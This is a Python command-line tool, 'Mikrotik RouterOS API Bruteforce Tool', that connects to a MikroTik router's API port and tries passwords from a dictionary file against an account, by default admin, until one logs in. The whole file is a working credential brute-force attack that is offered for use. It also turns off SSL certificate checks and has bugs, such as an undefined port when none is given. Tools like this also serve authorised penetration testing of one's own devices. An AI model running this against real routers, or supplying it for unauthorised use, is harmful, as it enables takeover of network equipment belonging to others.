#!/usr/bin/env python
# -*- coding: utf-8 -*-

#Check for Python3
import sys
if sys.version_info < (3, 0):
    sys.stdout.write("Sorry, Python 3.x is required to run this tool\n")
    sys.exit(2)

import binascii, getopt, hashlib, select, socket, time, signal, codecs, ssl
import json, os
from _log import Log

# Constants - Define defaults
USE_SSL = False
TARGET = None
PORT = 8728  # Default port
SSL_PORT = 8729
USER = None
PASSWORD = None
VERBOSE = False  # Whether to print API conversation width the router. Useful for debugging
VERBOSE_LOGIC = 'OR'  # Whether to print and save verbose log to file. AND - print and save, OR - do only one.
VERBOSE_FILE_MODE = 'w'  # Weather to create new file ('w') for log or append to old one ('a').

CONTEXT = ssl.create_default_context()  # It is possible to predefine context for SSL socket
CONTEXT.check_hostname = False
CONTEXT.verify_mode = ssl.CERT_NONE

class LoginError(Exception):
    pass

class WordTooLong(Exception):
    pass

class CreateSocketError(Exception):
    pass

class RouterOSTrapError(Exception):
    pass


banner=('''
        __  __ _ _              _   _ _        _    ____ ___      ____  _____
        |  \/  (_) | ___ __ ___ | |_(_) | __   / \  |  _ \_ _|    | __ )|  ___|
        | |\/| | | |/ / '__/ _ \| __| | |/ /  / _ \ | |_) | |_____|  _ \| |_
        | |  | | |   <| | | (_) | |_| |   <  / ___ \|  __/| |_____| |_) |  _|
        |_|  |_|_|_|\_\_|  \___/ \__|_|_|\_\/_/   \_\_|  |___|    |____/|_|


                    Mikrotik RouterOS API Bruteforce Tool 1.1
                            André Henrique (@mrhenrike)
          Please report tips, suggests and problems to Twitter (@mrhenrike)
                    https://github.com/mrhenrike/MikrotikAPI-BF
       ''')

def usage():
    print('''
    NAME
    \t mikrotikapi-bf.py - Brute force attack tool on Mikrotik box credentials exploiting API requests\n
    USAGE
    \t python mikrotikapi-bf.py [-t] [-p] [-u] [-d] [-s] [-q] [-a]\n
    OPTIONS
    \t -t, --target \t\t RouterOS target
    \t -p, --port \t\t RouterOS port (default 8728)
    \t -u, --user \t\t User name (default admin)
    \t -h, --help \t\t This help
    \t -d, --dictionary \t Password dictionary
    \t -s, --seconds \t\t Delay seconds between retry attempts (default 1)
    \t -q, --quiet \t\t Quiet mode
    \t -a, --autosave \t\t Automatically save current progress to file, and read from it on startup

    EXAMPLE
    \t python3 mikrotikapi-bf.py -t 192.168.0.200 -u manager -p 1337 -d /tmp/passwords.txt -s 5
    \t python3 mikrotikapi-bf.py -t 192.168.0.1 -d /tmp/passwords.txt
    \t python3 mikrotikapi-bf.py -t 192.168.0.1 -d /tmp/passwords.txt -a /tmp/autosave.json
    ''')


def error(err):
    print(err)
    print("Try 'mikrotikapi-bf.py -h' or 'mikrotikapi-bf.py --help' for more information.")


def signal_handler(signal, frame):
    print(" Aborted by user. Exiting... ")
    sys.exit(2)


class ApiRos:
    '''Modified class from official RouterOS API'''
    def __init__(self, sk, target, user, password, port, use_ssl=USE_SSL,
                 verbose=VERBOSE, context=CONTEXT):

        self.target = target
        self.user = user
        self.password = password
        self.use_ssl = use_ssl
        self.port = port
        self.verbose = verbose
        self.context = context
        self.status = None
        
        self.sk = sk
        self.currenttag = 0

         # Create Log instance to save or print verbose logs
        sys.log = Log(verbose, VERBOSE_LOGIC, VERBOSE_FILE_MODE)
        sys.log('')
        sys.log('#--------Mikrotik API Brute-force Attack#--------')
        sys.log('#-----------------------------------------------#')
        sys.log('API IP - {}, USER - {}'.format(target, user))
        self.sock = None
        self.connection = None
        self.create_connection()
        sys.log('Instance of Api created')

    # Open socket connection with router and wrap with SSL if needed.
    def open_socket(self):
        for res in socket.getaddrinfo(self.target, self.port, socket.AF_UNSPEC, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res

        self.sock = socket.socket(af, socket.SOCK_STREAM)
        self.sock.settimeout(5)  # Set socket timeout to 5 seconds, default is None

        connected = False
        while not connected:
            try:
                # Trying to connect to RouterOS, error can occur if IP target is not reachable, or API is blocked in
                # RouterOS firewall or ip services, or port is wrong.
                self.connection = self.sock.connect(sa)
                connected = True

            except (socket.timeout):
                print("[-] SOCKET TIMEOUT! Target timed out!")
                time.sleep(60)

            except OSError:
                print("[-] SOCKET ERROR! Check Target (IP or PORT parameters). Exiting...")
                raise CreateSocketError('Error: API failed to connect to socket. Host: {}, port: {}.'.format(self.target, self.port))

        # if self.use_ssl:
        #     try:
        #         self.sock = self.context.wrap_socket(self.sock)
        #     except:
        #        print("[-] SOCKET ERROR! The handshake operation timed out. Exiting...") 
        #        pass

        sys.log('API socket connection opened.')

    def login(self, username, pwd):
        sentence = ['/login', '=name=' + username, '=password=' + pwd]
        reply = self.communicate(sentence)
        if len(reply[0]) == 1 and reply[0][0] == '!done':
            # If login process was successful
            sys.log('Logged in successfully!')
            return reply
        elif 'Error' in reply:
            # Else if there was some kind of error during login process
            sys.log('Error in login process - {}'.format(reply))
            raise LoginError('Login ' + reply)
        elif len(reply[0]) == 2 and reply[0][1][0:5] == '=ret=':
            # Else if RouterOS uses old API login method, code continues with old method
            sys.log('Using old login process.')
            md5 = hashlib.md5(('\x00' + pwd).encode('utf-8'))
            md5.update(binascii.unhexlify(reply[0][1][5:]))
            sentence = ['/login', '=name=' + username, '=response=00'
                        + binascii.hexlify(md5.digest()).decode('utf-8')]
            sys.log('Logged in successfully!')
            return self.communicate(sentence)
    
    # Sending data to router and expecting something back
    def communicate(self, sentence_to_send):

        # There is specific way of sending word length in RouterOS API.
        # See RouterOS API Wiki for more info.
        def send_length(sentence_to_send):
            length_to_send = len(sentence_to_send)
            if length_to_send < 0x80:
                num_of_bytes = 1  # For words smaller than 128
            elif length_to_send < 0x4000:
                length_to_send += 0x8000
                num_of_bytes = 2  # For words smaller than 16384
            elif length_to_send < 0x200000:
                length_to_send += 0xC00000
                num_of_bytes = 3  # For words smaller than 2097152
            elif length_to_send < 0x10000000:
                length_to_send += 0xE0000000
                num_of_bytes = 4  # For words smaller than 268435456
            elif length_to_send < 0x100000000:
                num_of_bytes = 4  # For words smaller than 4294967296
                self.sock.sendall(b'\xF0')
            else:
                raise WordTooLong('Word is too long. Max length of word is 4294967295.')
            self.sock.sendall(length_to_send.to_bytes(num_of_bytes, 'big'))
            sys.log('Sent length {}'.format(length_to_send.to_bytes(num_of_bytes, 'big')))

        for sentence in sentence_to_send:
            send_length(sentence)
            self.sock.sendall(sentence.encode('utf-8'))
            sys.log('Sent sentence {}'.format(sentence))

        self.sock.sendall(b'\x00')

        # Now receiving answer and passing to output
        response = []
        while True:
            word = self.receive_length()
            if word == '':
                break
            response.append(word)

        return response

    def receive_length(self):
        rcvlen = ord(self.sock.recv(1))
        if rcvlen & 0x80 == 0x00:
            pass
        elif rcvlen & 0xC0 == 0x80:
            rcvlen &= ~0xC0
            rcvlen <<= 8
            rcvlen += ord(self.sock.recv(1))
        elif rcvlen & 0xE0 == 0xC0:
            rcvlen &= ~0xE0
            rcvlen <<= 8
            rcvlen += ord(self.sock.recv(1))
            rcvlen <<= 8
            rcvlen += ord(self.sock.recv(1))
        elif rcvlen & 0xF0 == 0xE0:
            rcvlen &= ~0xF0
            rcvlen <<= 8
            rcvlen += ord(self.sock.recv(1))
            rcvlen <<= 8
            rcvlen += ord(self.sock.recv(1))
            rcvlen <<= 8
            rcvlen += ord(self.sock.recv(1))
        elif rcvlen & 0xF8 == 0xF0:
            rcvlen = ord(self.sock.recv(1)) << 24
            rcvlen += ord(self.sock.recv(1)) << 16
            rcvlen += ord(self.sock.recv(1)) << 8
            rcvlen += ord(self.sock.recv(1))
        return self.sock.recv(rcvlen).decode('utf-8')

    # Tries to login using default (admin with blank password) credentials on RouterOS API
    def create_connection(self):
        self.open_socket()
        self.login(self.user, self.password)

    def close_connection(self):
        self.sock.close()
        sys.log('API socket connection closed.')

def read_save_file(file):
    with open(file, 'r') as f:
        return json.load(f)

def write_save_file(file, data):
    with open(file, 'w') as f:
        return json.dump(data, f)

def main():
    try:
        # Arguments are getting here
        opts, args = getopt.getopt(sys.argv[1:], "ht:p:u:d:s:qa:", ["help", "target=", "port=", "user=", "dictionary=", "seconds=", "quiet", "autosave="])

        target = None
        user = "admin"
        dictionary = None
        seconds = 1
        quiet = False
        autosave = None

        for opt, arg in opts:
            if opt in ("-h", "--help"):
                usage()
                sys.exit()
            elif opt in ("-t", "--target"):
                target = arg
            elif opt in ("-p", "--port"):
                port = int(arg)  # Convert port argument to integer
            elif opt in ("-u", "--user"):
                user = arg
            elif opt in ("-d", "--dictionary"):
                dictionary = arg
            elif opt in ("-s", "--seconds"):
                seconds = int(arg)
            elif opt in ("-q", "--quiet"):
                quiet = True
            elif opt in ("-a", "--autosave"):
                autosave = arg

        if target is None or dictionary is None:
            error("Target or Dictionary file was not specified")
            sys.exit(2)

        # Start brute force
        signal.signal(signal.SIGINT, signal_handler)
        
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        api = ApiRos(sk, target, user, "", port)  # Pass port to ApiRos
        
        with open(dictionary, 'r') as f:
            passwords = [line.strip() for line in f]

        # If autosave file exists, load progress
        if autosave and os.path.exists(autosave):
            saved_data = read_save_file(autosave)
            start_index = saved_data.get('last_attempted', 0)
            passwords = passwords[start_index:]
        else:
            start_index = 0

        for index, pwd in enumerate(passwords, start=start_index):
            try:
                sys.log("Trying password: {}".format(pwd))
                api.login(user, pwd)
                print("Password found: {}".format(pwd))
                break
            except LoginError as e:
                if not quiet:
                    print("Failed with password: {}".format(pwd))
                time.sleep(seconds)
                if autosave:
                    write_save_file(autosave, {'last_attempted': index})
            except CreateSocketError as e:
                print(e)
                break

        api.close_connection()

    except getopt.GetoptError as err:
        error(str(err))
        sys.exit(2)

if __name__ == "__main__":
    main()